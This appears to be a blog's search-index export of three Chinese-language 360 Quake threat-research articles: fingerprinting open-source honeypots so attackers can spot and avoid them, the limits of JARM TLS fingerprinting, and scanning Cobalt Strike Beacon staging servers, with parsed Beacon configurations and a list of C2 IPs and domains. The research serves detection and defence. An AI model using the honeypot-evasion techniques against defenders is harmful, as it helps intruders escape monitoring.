    "snippet": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.0x01 前言蜜罐是网络红蓝攻防对抗中检测威胁的重要产品。防守方常常利用蜜罐分析攻击行为、捕获漏洞、甚至反制攻击者。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度出发钻研蜜罐识别...",
    "content": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.0x01 前言蜜罐是网络红蓝攻防对抗中检测威胁的重要产品。防守方常常利用蜜罐分析攻击行为、捕获漏洞、甚至反制攻击者。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度出发钻研蜜罐识别的方式方法。0x02 介绍蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。根据蜜罐的交互特征，可以分为低交互蜜罐和高交互蜜罐。后者提供了一个真正的易受攻击的系统，为的就是让攻击者认为自己在攻击一个真实的系统，在一些甲方实际的蜜罐建设中还提出了使用真实的服务组件构建蜜罐系统的想法。低交互蜜罐则没有这么复杂，其提供了一个不完善的交互系统，有的甚至仅仅模拟了一个响应。互联网中的低交互蜜罐大部分为开源蜜罐。由于其特有的开放特性，人们能够对其特征进行识别和规避。在本次浅析的过程中，探测的目标为使用了默认配置的开源蜜罐。我们调查了19种开源蜜罐和Fuzz testing 特征蜜罐。本次浅析的目的是从攻击者角度出发找出开源蜜罐的特征，并且调查默认配置的开源蜜罐使用的分布。本次分析的蜜罐如下表所示。0x03 基于特征的蜜罐监测3.1 协议的返回特征部分开源蜜罐在模拟各个协议时，会在响应中带有一些明显的特征，可以根据这些特征来检测蜜罐。拿Dionaea 的Memcached协议举例，在实现Memcached协议时Dionaea把很多参数做了随机化，但是在一些参数如：version、libevent和rusage_user等都是固定的。可以通过组合查询其固定参数来确定蜜罐，其他蜜罐在协议上的特征如下表所示。3.2 协议实现的缺陷在部分开源的蜜罐中模拟实现部分协议并不完善，我们可以通过发送一些特定的请求包获得的响应来判断是否为蜜罐。3.2.1 SSH协议SSH协议（Secure Shell）是一种加密的网络传输协议，最常用的是作为远程登录使用。SSH服务端与客户端建立连接时需要经历五个步骤：  协商版本号阶段。  协商密钥算法阶段。  认证阶段。  会话请求阶段。  交互会话阶段。SSH蜜罐在模拟该协议时同样要实现这五个步骤。Kippo 是一个已经停止更新的经典的SSH蜜罐，使用了twisted来模拟SSH协议。在kippo的最新版本中使用的是很老的twistd 15.1.0版本。该版本有个明显的特征。在版本号交互阶段需要客户端的SSH版本为形如SSH-主版本-次版本 软件版本号，当版本号为不支持的版本时，如SSH-1.9-OpenSSH_5.9p1就会报错“bad version 1.9”并且断开连接。通过Kippo的配置来看，仅仅支持SSH-2.0-X和SSH-1.99-X两个主版本，其他主版本都会产生报错。3.2.2 Mysql协议部分Mysql蜜罐会通过构造一个恶意的mysql服务器，攻击者通过连接恶意的mysql服务器后发送一个查询请求，恶意的mysql服务器将会读取到攻击者指定的文件。最早的如https://github.com/Gifts/Rogue-MySql-Server，可以伪造一个恶意的mysql服务器,并使用mysql客户端连接，如下图可见恶意的mysql服务器端已经成功读取到了客户端的/etc/password内容。检测此类蜜罐的步骤可分为如下几步：  伪造客户端连接蜜罐mysql服务  连接成功发送mysql查询请求  接受mysql服务器响应，通过分析伪造的mysql客户端读取文件的数据包得到的报文结构：文件名长度+1 + \\x00\\x00\\x01\\xfb + 文件名那么我们就可以通过socket构造对应的流程即可识别伪造的mysql服务器，并抓取读取的文件名。    3.2.3 Telnet协议  Hfish 蜜罐中实现了Telnet协议，默认监听在23端口。模拟的该协议默认无需验证，并且对各个命令的结果都做了响应的模板来做应答。在命令为空或者直接回车换行时，会响应default模板，该模板内容为test。因此可以利用这个特征进行该蜜罐在telnet服务上的检测如图所示。3.3 明显的WEB的特征部分开源蜜罐提供了web服务，这些web服务中常常会带有一些明显的特征，可以根据这些特征来检测蜜罐。如特定的js文件、build_hash或者版本号等。还是拿Hfish举例。HFIsh在默认8080端口实现了一个WordPress登录页面，页面中由一个名为x.js的javascript文件用来记录尝试爆破的登录名密码。直接通过判断wordpress登录页是否存在x.js文件就可判断是否为蜜罐。还有glastopf蜜罐，其没做任何伪装是最明显的。可以通过页面最下方的blog comments的输入框进行识别。其他的常见的开源蜜罐在WEB上的特征如下表所示。3.4 上下文特征部分开源蜜罐存在命令执行上下文明显的特征，本节以Cowrie和Hfish为例。2020年6月份研究人员发现Mirai的新变种Aisuru检测可以根据执行命令的上下文检测到Cowrie开源蜜罐。当满足如下三个条件时Aisuru将会判定为蜜罐：  设备名称为localhost。  设备中所有进程启动于6月22日或6月23日。  存在用户名richard。查看Cowrie源码在默认配置中执行ps命令，发现进程的启动时间都在6月22或6月23。不过在最新版的Cowrie中richard被phil替换，并且主机名由localhost替换为svr04。由Aisuru的启发，是可以根据一些特定的上下文来检测蜜罐的。比如最新版的Cowrie，在默认配置下一些一些命令得到的结果是固定不变的。如：cat /proc/meminfo 这个命令无论执行多少次得到的内容都是不变的，而这真实的系统中是不可能的。再说Hfish蜜罐，Hfish同样也实现了SSH协议，默认监听在22端口。该蜜罐的SSH协议同样可以很容易的通过上下文识别出来。和telnet协议一样SSH协议在直接进行回车换行时会默认执行default输出test。3.5 Fuzz testing 特征Fuzz testing（模糊测试）本是一种安全测试的方法，通过产生随机的数据输入测试系统查看系统响应或者状态，以此发现潜在的安全漏洞。部分蜜罐借用Fuzz testing的思想实现了蜜罐系统，通过netlab的 zom3y3大哥在《通过Anglerfish蜜罐发现未知的恶意软件威胁》种对Fuzz testing蜜罐的介绍，我们得知有以下几点特征：  响应任意端口的TCP SYN Packet。  根据协议特征，永远返回正确的响应。  返回预定义或者随机的Payload特征库集合。该蜜罐很容易通过人工判断，其目的为模拟蜜罐fuzzing特征，通过预定义大量的关键字实现对扫描器的干扰。该类蜜罐可以通过跨服务的特征进行判断，如开放了HTTP服务同时响应了upnp协议，或者根据server的长度或者个数来判断。由于未知哪种蜜罐产品提供的这个蜜罐服务，quake将此蜜罐标记为未知蜜罐，可以使用语法app:”未知蜜罐”搜索。0x04 开源蜜罐的使用情况4.1 蜜罐分布在确定了部分开源蜜罐的特征后，我们利用特征进行了全网匹配，发现了369161条服务数据和72948个独立ip。全球和全国蜜罐分布如图所示。可以看到在这些开源蜜罐中，中国的数量是最多的。其中，中国台湾占据了1/3，位于国内第一。并且在全球省份排名中，台湾省的数量是第一的。从ASN的分布上来看，ASN数量全球TOP5如表所示。发现开源蜜罐主要还是部分部署在云厂商或者教育网中。4.2 生命周期结合蜜罐服务资产数和ASNTOP5全年的分布可以看，蜜罐数量在全年由三个峰值，分别为四月、六月和十二月。在之前讨论蜜罐的fuzz testing时，发现在响应中含有大量与服务有关的关键词，用来干扰扫描器服务识别。其中我发现在服务的响应中含有weblogic关键词的蜜罐在十一月开始爆发，我们知道在十月份CVE-2020-14882 weblogic未授权命令执行漏洞被披露出来。我们可以做一个猜想，此类蜜罐可以根据热点漏洞进行进行灵活配置，以达到捕捉扫描器的目的。0x05 结论本文通过通过蜜罐协议返回特征、协议实现的缺陷、明显的WEB特征和Fuzz testing的特征对常见的19种开源蜜罐进行了分析。我们的研究发现，互联网中存在有超过369161个蜜罐服务，这些蜜罐都可以通过最简单的特征被检测出来，因为这些蜜罐都是在默认配置情况下被开放在互联网上，基本上是一种自我暴露的状态。从全球分布上来看中国台湾集中了大量的蜜罐，在全球蜜罐的ASN分布中，主要集中在云厂商和教育网络中。同时在全年的蜜罐数量上在四月份、六月份和十二月份存在三个峰值，并且通过部分蜜罐响应的关键字来看，蜜罐的数量可能会随着热点漏洞的披露而增长。最后，本文种所涉及的蜜罐均可在Quake种搜索，搜索语法见附录。或者可以通过Quake命令行工具进行识别（https://github.com/360quake/quake_rs）。0x06 参考[1] 蜜罐技术研究新进展[J]. 石乐义,李阳,马猛飞. 电子与信息学报. 2019(02)[2] 基于数据包分片的工控蜜罐识别方法[J]. 游建舟,张悦阳,吕世超,陈新,尹丽波,孙利民. 信息安全学报. 2019(03)[3] VETTERL, A., AND CLAYTON, R. Bitter harvest: Systematically fingerprinting low- and medium-interaction honeypots at internet scale.In 12th USENIX Workshop on Offensive Technologies, WOOT’18.[4] http://books.gigatux.nl/mirror/honeypot/final/ch09lev1sec1.html[5] https://mp.weixin.qq.com/s/_hpJP6bTuoH-3cQtDawGOw[6] https://www.avira.com/en/blog/new-mirai-variant-aisuru-detects-cowrie-opensource-honeypots[7] https://hal.archives-ouvertes.fr/hal-00762596/document[8] https://subs.emis.de/LNI/Proceedings/Proceedings170/177.pdf[9] https://www.freebuf.com/articles/ics-articles/230402.html[10] http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/[11] https://github.com/mushorg/conpot[12] https://github.com/cowrie/cowrie[13] https://github.com/DinoTools/dionaea[14] https://github.com/jordan-wright/elastichoney[15] https://github.com/bontchev/elasticpot[16] https://github.com/mushorg/glastopf[17] https://github.com/hacklcx/HFish/[18] https://github.com/omererdem/honeything[19] https://github.com/desaster/kippo[20] https://github.com/madirish/kojoney2[21] https://github.com/jrwren/nepenthes[22] https://github.com/thinkst/opencanary[23] https://github.com/Gifts/Rogue-MySql-Server[24] https://github.com/jaksi/sshesame[25] https://github.com/Cymmetria/weblogic_honeypot[26] https://github.com/bg6cq/whoisscanme[27] https://github.com/zeroq/amun[28] https://github.com/foospidy/HoneyPy[29] https://github.com/Cymmetria/StrutsHoneypot附录：            蜜罐      QUAKE DORK              ——————————      —————————-              STRUTSHONEYPOT      app:”StrutsHoneypot”              CONPOT HTTP 蜜罐      app:”Conpot Http 蜜罐”              CONPOT MODBUS 蜜罐      app:”Conpot modbus 蜜罐”              CONPOT S7 蜜罐      app:”Conpot s7 蜜罐”              KIPPO 蜜罐      app:”kippo 蜜罐”              HONEYPY HTTP 蜜罐      app:”Honeypy Http 蜜罐”              HONEYPY ES 蜜罐      app:”Honeypy ES蜜罐”              AMUN IMAP 蜜罐      app:”amun imap 蜜罐”              AMUN HTTP 蜜罐      app:”amun http蜜罐”              NEPENTHES NETBIOS蜜罐      app:”Nepenthes netbios蜜罐”              NEPENTHES FTP 蜜罐      app:”Nepenthes FTP 蜜罐”              SSHESAME SSH 蜜罐      app:”sshesame ssh 蜜罐”              OPENCANARY 蜜罐管理后台      app:”opencanary蜜罐管理后台”              DIONAEA SIPD 蜜罐      app:”Dionaea sipd 蜜罐”              DIONAEA SMBD 蜜罐      app:”Dionaea smbd 蜜罐”              DIONAEA HTTP 蜜罐      app:”Dionaea Http 蜜罐”              DIONAEA MSSQL 蜜罐      app:”Dionaea MSSQL 蜜罐”              DIONAEA FTP 蜜罐      app:”Dionaea ftp 蜜罐”              DIONAEA MEMCACHED 蜜罐      app:”Dionaea Memcached 蜜罐”              KOJONEY SSH 蜜罐      app:”Kojoney SSH 蜜罐”              WEBLOGIC 蜜罐      app:”weblogic蜜罐”              MYSQL 蜜罐      app:”MySQL蜜罐”              HFISH 蜜罐      app:”HFish蜜罐”              HFISH 蜜罐管理后台      app:”HFish蜜罐管理后台”              HONEYTHING 物联网蜜罐      app:”honeything物联网蜜罐”              ELASTICSEARCH 蜜罐      app:”elasticsearch蜜罐”              HOSTUS 蜜罐      app:”HostUS蜜罐”              WHOISSCANME 蜜罐      app:”whoisscanme蜜罐”              未知蜜罐      app:”未知蜜罐”              COWRIE TELNETD 蜜罐      app:”Cowrie telnetd蜜罐”              GLASTOPF 蜜罐      app:”glastopf蜜罐”      "
  },
  
  {
    "title": "TLS server-side tagging using JARM fingerprinting (chinese)",
    "url": "/posts/TLS_server_side_tagging/",
    "categories": "Hunter, Jarm",
    "tags": "",
    "date": "2020-12-14 12:13:00 +0800",
    





    
    "snippet": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.0x01 背景对网络空间测绘数据的分析和发掘，是Quake团队一直以来的核心目标。十几年来Web应用的飞速发展使其毋庸置疑的成为了互联网的主流。为了弥补Web应用和HTTP协议的各类安全问题，HTTP over ...",
    "content": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.0x01 背景对网络空间测绘数据的分析和发掘，是Quake团队一直以来的核心目标。十几年来Web应用的飞速发展使其毋庸置疑的成为了互联网的主流。为了弥补Web应用和HTTP协议的各类安全问题，HTTP over SSL/TLS在互联网中的比例也逐年提升。因此，对全网SSL/TLS相关测绘与数据分析一直是Quake系统关注的重点之一。当前Quake系统已经支持任意端口、任意协议使用的SSL/TLS证书提取、分析、握手包的解析与留存。注册用户在证书窗口中就可以看到TLS证书按照x509格式进行解析后的内容，同时 付费会员（高级会员、终身会员、企业会员）可以在 tls协议 窗口中看到完整的TLS握手过程，并提供格式化解析后的数据，在 server_certificates 中就包含了对服务端证书的指纹采集计算。如下图所示：与此同时，我们也在持续关注TLS主动测绘方向的前沿研究。近期，我们留意到有关研究人员在发布了一篇名为Easily Identify Malicious Servers on the Internet with JARM的文章，并在github上发布了一个JARM扫描工具，相关内容引起了国外部分研究人员的讨论。在Quake团队小伙伴一致努力下，现已将此功能集成入Quake系统。经过一段时间的分析研究，我们也总结出一些关于JARM的认识与大家交流和分享。抛砖引玉，希望大家多多指正。0x02 JARM介绍JARM 是一个主动式TLS服务端指纹工具，主要用途如下：  快速验证一组TLS服务器是否使用相同的TLS配置；  通过TLS配置划分TLS服务器，并识别可能归属的公司；  识别网站默认的应用或基础架构；  识别恶意软件C&amp;C控制节点，以及其他恶意服务器。2.1 JARM工作原理想要理解JARM工作原理，必须要了解TLS工作的流程，这里就不再详细讲解，我们用一句话简单概括下TLS握手的大致目的：客户端和服务端双方基于彼此的配置进行沟通、协商和校验，在达成一致后生成密钥。而JARM的核心在于：TLS Server根据TLS Client Hello中参数的不同，返回不同的Server Hello数据包。而Client Hello的参数可以人为指定修改，因此通过发送多个精心构造的Client Hello获取其对应的特殊Server Hello，最终形成TLS Server的指纹（有点类似于Fuzz的感觉）。 具体能够产生影响的参数包括但不限于：  操作系统及其版本  OpenSSL等第三方库及其版本  第三方库的调用顺序  用户自定义配置  ……2.2 JARM工作流程JARM通过主动向TLS服务器发送10个TLS Hello数据包并对Server Hello中的特定字段进行分析，以特定方式对10个TLS服务器响应进行哈希处理，最终生成JARM指纹。JARM中的10个TLS客户端Hello数据包经过特殊设计，目的就是提取TLS服务器中的唯一响应。例如：  JARM以不同的顺序发送不同的TLS版本，密码和扩展；  TLS Clint将密码从最弱到最强排序，TLS Server将选择哪种密码？  ……总之JARM与我们在进行流量分析威胁时常用的JA3、JA3/S不同：  JA3、JA3/S主要基于流量  JARM则是完全主动的扫描并生成指纹因此有了上述的理论基础，我们尝试分析JARM工具的具体代码。2.3 JARM工具代码分析首先在main函数，jarm定义了10种TLS Client Hello数据包生成的结构，分别包含了待扫描的目标、端口、tls客户端加密套件、TLS扩展列表：然后依次遍历这10种TLS Client Hello结构生成数据包，并使用packet_building函数生成对应的TLS Client Hello数据包，然后依次发送数据包：通过send_packet发送数据包以后，使用read_packet解析返回TLS Server Hello，并拼接为如下格式：字段含义：`|  |  || — | — ||1|服务器返回的加密套件 | 服务器返回选择使用的TLS协议版本 |  TLS扩展ALPN协议信息 | TLS扩展列表|`通过发送10次TLS Client Hello并解析为以上格式，将10次解析的结果拼接以后最终调用jarm_hash算出最终的结果。jarm_hash前30个字符由加密套件和TLS协议版本分别使用cipher_bytes、version_byte函数计算拼接而来，其余的32个字符是由TLS扩展ALPN协议信息和TLS扩展列表通过sha256哈希并截取而来：0x03 JARM的应用与问题3.1 利用JARM搜寻服务端通过上述对JARM的研究我们理解了JARM的原理。因此将JARM集成进入了Quake底层识别引擎Vscan的协议深度识别流程之中。其实在我们之前的文章浅析 CobaltStrike Beacon 扫描中，有心的小伙伴已经留意到了在某些支持SSL/TLS的端口 端口响应 标签文本末尾有一串形如“JARM:xxxxxxxxxxxxxxx”的字符串，这便是该端口的JARM指纹。Quake搜索语法如下，注意替换JARM:之后的内容：`|  |  || — | — ||1|response:\"JARM:07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\"|现目前Quake**注册用户**就能够在端口响应` 文本的末尾看到其JARM指纹。该内容为系统自动追加后的数据，并不是该端口原始返回数据，请注意区分。同时，所有 终身会员、企业会员 能够查看TLS-JARM协议深度识别的内容：经过一段持续测绘后，我们发现了一些有趣的现象，下面让我们一起看看。3.2 利用JARM识别C2与问题在Easily Identify Malicious Servers on the Internet with JARM原文中，作者给出了一份C2和JARM对应的清单，这里我们就不赘述了。当我们得到这些C2和JARM的时候是十分高兴的，因为在理想情况下如果JARM与C2唯一对应，那么我们就多了一种主动发现C2节点的特征。可是事与愿违，搜索上面的那个CS对应的JARM: response:\"07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\"我们发现数量不少，独立IP有2338个。但是 TOP5的应用为：            应用      数量                  Cobalt Strike团队服务器      1,137              CobaltStrike-Beacon服务端      373              Tomcat-Web服务器      40              Weblogic应用服务器      21              WordPressCMS博客系统      14      可以看到和上面CobaltStrike相同JARM的还有 Tomcat、Weblogic和WordPress等开启TLS的Web应用，也就是说CobaltStrike这个应用只是该JARM对应TLS服务器其中的一个子集。继续在本地搭建环境进行测试，Cobalt Strike 4.0 在JDK 11.0.9.1下 JARM为 07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1。在Quake中搜索： response:\"CobaltStrike Beacon configurations\" AND response:\"07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\"，发现没有CobaltStrike Beacon为这个JARM。回到本地环境切换JDK版本，同一个Cobalt Strike 4.0，在JDK 1.8.0_212情况下JARM为：07d2ad16d21d21d07c07d2ad07d21d9b2f5869a6985368a9dec764186a9175。看来JARM似乎和CobaltStrike无关，为了证明这一点，在相同JDK环境下搭建Tomcat服务配置TLS。结果如下：JDK 11.0.9.1 Tomcat 9.0.41 JARM 07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1JDK 1.8.0_212 Tomcat 9.0.41 JARM 07d2ad16d21d21d07c07d2ad07d21d9b2f5869a6985368a9dec764186a9175发现JARM分别和CobaltStrike在两个JDK环境下的一样，看来这个和CobaltStrike不是强关联性的，也解释了为什么会有那么多的Weblogic和Tomcat应用被识别出来了。进一步对多个JDK版本进行测试得到如下结果：看来，我们并不能直接通过JARM去判定CobaltStrike；同样，对于CobaltStrike而言JARM也并不唯一，其JARM与不同JDK环境下TLS服务有关。JARM只能作为一个辅助手段，结合之前CobaltStrike的特征，我们提取了部分CobaltStrike服务器的JARM数据放置在Quake的开源仓库中，仅供业界研究使用（不作为精准威胁情报）：CobaltStrike-JARM0x04 结论与思考JARM其实对识别CobaltStrike等上层应用软件并不十分可靠，仅仅能够起到一个辅助的作用，实际工作中还是要结合多方面的信息来进行判断。但是，也不是说JARM完全没有作用，JARM的本质是对TLS服务进行标记，例如：我们可以结合已知的JDK版本对应的JARM可以看到公网上运行在特定版本JDK环境下的服务，如图为运行在JDK 11.0.9.1的ELasticSearch，运行在JDK 11.05的Weblogic。JARM仅仅是一种TLS服务端特征的标识方式， 不能完全被用作Web上层应用的唯一指纹 。总归来说，JARM提供的思路大于其本身价值：利用主动测绘的方式，向目标发送各类数据包，根据不同的返回进而发掘、分析、提取目标特征。正如在A Red Teamer Plays with JARM中提到的：  This is a commoditized threat intelligence practice. If your blue team uses this type of information, there are a lot of options to protect your infrastructure.  基于主动测绘的威胁情报正在各个方向落地生根。通过对主动测绘数据各个维度的统计、分析信息，能够提供新的防护思路。Happy hunting by using 360-Quake.0x05 参考文章  https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a  https://github.com/salesforce/jarm  https://blog.cobaltstrike.com/2020/12/08/a-red-teamer-plays-with-jarm/"
  },
  
  {
    "title": "Analysis of CobaltStrike Beacon Staging Server Scanning (chinese)",
    "url": "/posts/Cobalt_Strike_Beacon_Staging_Server_scan/",
    "categories": "Hunter, honeypot",
    "tags": "",
    "date": "2020-12-14 12:13:00 +0800",
    





    
    "snippet": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.浅析 CobaltStrike Beacon Staging Server 扫描0x01 前言对网络空间测绘数据的分析和发掘，是Quake团队一直以来的核心目标。近期，我们留意到有国外安全研究人员在github上...",
    "content": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.浅析 CobaltStrike Beacon Staging Server 扫描0x01 前言对网络空间测绘数据的分析和发掘，是Quake团队一直以来的核心目标。近期，我们留意到有国外安全研究人员在github上发布了一个Cobalt Strike Beacon的扫描工具，可以提取Beacon的配置信息。于是经过Quake团队小伙伴一致努力下，将此功能集成入Quake系统，经过一小段时间的扫描颇见成效。下面我们将详细介绍Beacon Staging Server扫描的原理。0x02 Beacon是什么从事渗透测试、红队攻防的小伙伴一定对这个概念并不陌生，我们这里直接使用Gcow安全团队文章里的一段介绍：Beacon是Cobalt Strike运行在目标主机上的payload，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我们可以将其嵌入到可执行文件、添加到Word文档或者通过利用主机漏洞来传递Beacon。一图胜千言，本次我们通过主动测绘发现的就是团队服务器中的Beacon Listener。0x03 Beacon Staging ServerBeacon Staging Server的作用是为了防止Payload过大或者适应不同的攻击场景，可以分阶段进行payload投递。首先通过投递一个被称为stager的小巧的payload，然后去Beacon staging server下载体积较大更复杂的stage，并且访问stage的URL通过checksum8进行校验。当存储着Beacon配置和payload的stage服务器暴露在公网上的时候，是可以通过主动测绘手段发现的。不幸的是，默认情况下访问该服务是一个伪装的404页面。这也导致了各类扫描器、空间测绘系统、威胁情报平台等并不能基于页面response信息进行有效判断。如果不经过专门的扫描识别，一个Beacon Staging Server应该只会返回下图红框内的信息。需要拿到具体的Stage，就必须知道URL的生成算法。这段算法来自于公开的NSE脚本，我们使用以下脚本进行校验码的生成，并且可以根据不同的输入生成32位或64位的payload的校验码。通过拼接校验码到URL，我们便可以直接下载到Beacon的stage文件，而不是一个404页面。0x04 解析Beacon配置从Beacon staging server成功下载到stage后，我们需要对其进行解析。JPCERT在2018年发布了一个Volatility 插件cobaltstrikescan，用来解析Beacon的配置和payload。0x05 Quake主动测绘在明确了Beacon Staging Server的工作原理后，我们首先利用如下Quake搜索语法找出一批原始目标：response:”HTTP/1.1 404 Not Found” AND response:”Content-Type: text/plain” AND response:”Content-Length: 0” AND NOT response:”Server: “ AND NOT response:”Connection: “然后将上述结果中的IP进行针对性识别，最终我们将提取到的Beacon配置信息追加到了response端口相应之后：可以使用Quake搜索语法直接进行查询：app:\"CobaltStrike-Beacon服务端\"同时Quake对Beacon的配置也进行了深度解析，可以点击beacon协议查看：`|  |  || — | — ||1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859|{\"x86\": {\"payloadtype\": \"Beacon 类型\",\"port\": \"端口\",\"sleeptime\": \"60000\", Beacon 默认心跳时间，每一分钟目标主机与teamserver通信一次。\"c2\\_server\": \"C2 server\", C2服务器地址，以及URL路径\"user\\_agent\": \"ua\",\"post\\_uri\": \"/submit.php\",\"jitter\": \"0\", 针对睡眠时间的抖动率，随机睡眠。\"pipename\": \"smb beacon之间的通信的管道名称\" ,\"maxdns\": \"255\", 通过DNS上传数据时，主机名最大长度\"dns\\_idle\": \"0.0.0.0\", 表示改IP没有可用的任务,避免使用Bogon地址\"dns\\_sleep\": \"0\",每个单独的DNS请求前强制睡眠时间毫秒\"method1\": \"GET\",\"method2\": \"POST\",\"usescookies\": \"1\",\"spawnto\\_x86\": \"x86默认打开并注入shellcode的进程\",\"spawnto\\_x64\": \"x64默认打开并注入shellcode的进程\",\"proxy\\_type\": \"IE settings\", 代理类型// 进程注入选项\"process\\_inject\\_start\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\", 使用RWX作为注入内容的初始权限。另一种是RW。\"process\\_inject\\_use\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\", 使用RWX作为注入内容的最终权限。替代是RX。\"process\\_inject\\_min\\_alloc\": \"0\", 进程注入请求的最小内存\"process\\_inject\\_transform\\_x86\": \"NULL\", 转换成x86\"process\\_inject\\_transform\\_x64\": \"NULL\",转换成x64\"process\\_inject\\_execute\": \"\\\\x01\\\\x02\\\\x03\\\\x04\",\"process\\_inject\\_allocation\\_method\": \"0\",\"process\\_inject\\_stub\": \"F\\\\xa0úã\\\\x03äÒmaÿÆ£G\\\\xadïV\",\"publickey\": \"\" 公钥},\"x64\": {\"payloadtype\": \"\",\"port\": \"8080\",\"sleeptime\": \"60000\",\"c2\\_server\": \"l\",\"user\\_agent\": \"\",\"post\\_uri\": \"/submit.php\",\"jitter\": \"0\",\"pipename\": \"NULL\",\"maxdns\": \"255\",\"dns\\_idle\": \"0.0.0.0\",\"dns\\_sleep\": \"0\",\"method1\": \"GET\",\"method2\": \"POST\",\"usescookies\": \"1\",\"spawnto\\_x86\": \"%windir%\\\\\\\\syswow64\\\\\\\\rundll32.exe\",\"spawnto\\_x64\": \"%windir%\\\\\\\\sysnative\\\\\\\\rundll32.exe\",\"proxy\\_type\": \"IE settings\",\"process\\_inject\\_start\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\",\"process\\_inject\\_use\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\",\"process\\_inject\\_min\\_alloc\": \"0\",\"process\\_inject\\_transform\\_x86\": \"NULL\",\"process\\_inject\\_transform\\_x64\": \"NULL\",\"process\\_inject\\_execute\": \"\\\\x01\\\\x02\\\\x03\\\\x04\",\"process\\_inject\\_allocation\\_method\": \"0\",\"process\\_inject\\_stub\": \"F\\\\xa0úã\\\\x03äÒmaÿÆ£G\\\\xadïV\",\"publickey\": \"\"}}|`至此，Quake系统已经支持了2个有关Cobalt Strike的产品指纹识别，分别是：app:\"Cobalt Strike团队服务器\"app:\"CobaltStrike-Beacon服务端\"在Quake的检索结果页面上也会有标识：0x06 C2节点提取与分析在能够正常解析Beacon的配置文件后，我们可以看出c2_server字段是C2服务器及其URL的地址，因此我们进行提取和分析后发现如下几个现像：  绝大多数的C2地址就是Cobalt Strike其自身的IP，但是部分C2节点使用了域名进行连接；  相同IP的不同端口，C2节点配置不同，例如103.138.12[.]53。可以利用该现像找到C2真实IP。同时也可能说明该Cobalt Strike配置了多个C2节点：  存在多个不同的Cobalt Strike IP使用相同的C2地址现像。经过分析，可以判定这种情况是Cobalt Strike团队服务器有多个IP地址、或者有多个团队服务器：  存在一个Cobalt Strike IP使用不同C2的现像，例如搜索app: \"CobaltStrike-Beacon服务端\" AND response:\"153.92.127.212\"  大多数C2节点使用的域名是新的IoC，在VirusTotal等平台中基本不会被判黑。0x07 部分IoC截至本文编辑完成时，我们将已经识别出Beacon配置中C2地址进行了提取分析：共计777个CobaltStrike独立IP，781个Beacon** C2地址（其中独立IP580个，独立域名201个)。部分IoC如下：            CobaltStrikeBeacon IP      CobaltStrikeBeacon Port      Beacon C2 Address                  83.242.96.163      80      83.242.96.163              47.242.148.4      80      47.242.148.4              218.253.251.118      8443      218.253.251.118              5.34.181.12      5985      5.34.181.12              47.105.180.183      80      kinging.ysan.ml              185.244.149.152      443      yambanetsdev.net              23.224.41.132      80      23.224.41.132              46.148.26.246      443      199.217.117.184              185.150.117.50      443      185.150.117.50              49.234.94.85      8081      49.234.94.85              47.95.231.140      8080      47.95.231.140              176.121.14.249      80      176.121.14.249              144.217.207.21      443      52.188.209.63              185.212.47.171      443      skyler.shacknet.biz              114.118.5.108      443      114.118.5.108              39.100.224.129      8888      39.100.224.129              49.232.42.92      443      49.232.42.92              103.39.18.167      443      156.226.191.234              39.102.52.75      81      39.102.52.75              89.46.86.160      80      89.46.86.160              118.24.85.85      3306      118.24.85.85              47.95.119.10      8080      47.95.119.10              45.153.243.215      443      amajai-technologies.support              47.98.166.253      80      47.98.166.253              47.244.13.36      80      47.244.13.36              185.225.19.125      443      nguyenlieu.gratekey.com              192.144.234.207      80      192.144.234.207              51.195.35.0      8888      51.195.35.0              119.23.184.235      7777      119.23.184.235              152.32.252.47      8080      152.32.252.47              142.54.188.26      443      agturnfa.com              45.147.229.199      8080      45.147.229.199              106.55.153.204      443      106.55.153.204              49.233.155.141      7001      49.233.155.141              100.26.209.220      443      cdn.az.gov              103.73.97.119      443      103.73.97.119              114.116.33.191      8888      114.116.33.191              176.123.8.228      8000      176.123.8.228              153.92.127.204      443      io.amscloud.xyz              95.179.228.227      443      95.179.228.227              185.202.0.111      80      185.202.0.111              45.76.247.184      80      45.76.247.184              159.69.156.245      80      159.69.156.245              81.70.9.64      80      81.70.9.64              89.45.4.135      8080      89.45.4.135              185.52.3.205      443      185.52.3.205              49.232.217.171      80      49.232.217.171              78.128.113.14      443      78.128.113.14              88.99.89.152      80      88.99.89.152      由于C2节点是攻击者手工配置的，并不能保证全部都是100%判黑的依据（例如C2是内网IP或者是白名单域名），请悉知。如需获取全部IoC数据，请使用Quake系统 https://quake.360.cn 搜索：app: \"CobaltStrike-Beacon服务端\"下载。相关监管部门、企事业单位可联系当地360政企安全销售人员获取。0x08 结论正如Quake在产品发布会和今年ISC空间测绘分论坛上所讲的：网络空间测绘，始于资产，但不止于资产。我们认为，主动测绘数据将会与终端行为样本数据、网络流量通信数据一样，是未来网络安全大数据&amp;&amp;威胁情报数据的重要源头。主动测绘数据和基于测绘数据分析后形成的知识将能够极大补充我们的视野，从而开拓出更多的攻击面和领域。更多网络空间测绘领域研究内容，敬请期待~0x09 参考链接  https://blog.cobaltstrike.com/2016/06/22/talk-to-your-children-about-payload-staging/  